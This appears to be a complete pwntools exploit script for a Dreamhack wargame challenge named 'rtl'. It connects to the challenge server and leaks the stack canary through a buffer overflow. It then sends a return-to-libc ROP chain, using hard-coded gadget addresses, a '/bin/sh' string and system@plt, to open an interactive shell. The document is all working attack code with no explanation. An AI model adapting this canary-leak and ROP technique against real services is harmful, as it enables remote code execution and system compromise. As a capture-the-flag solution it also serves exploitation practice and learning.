from pwn import *

p = remote('host3.dreamhack.games', 9995)
e = ELF('./rtl')

def slog(name, addr): 
    return success(': '.join([name, hex(addr)]))

# [1] Leak canary
buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

# [2] Exploit
system_plt = e.plt['system']    # (gdb) info func @plt
binsh = 0x400874                # (gdb) search /bin/sh
pop_rdi = 0x0000000000400853    # $ ROPgadget --binary ./rtl --re "pop rdi"
ret = 0x0000000000400285        # $ ROPgadget --binary rtl

payload = b'A' * 0x38 + p64(cnry) + b'B' * 0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

pause()
p.sendafter(b'Buf: ', payload)

p.interactive()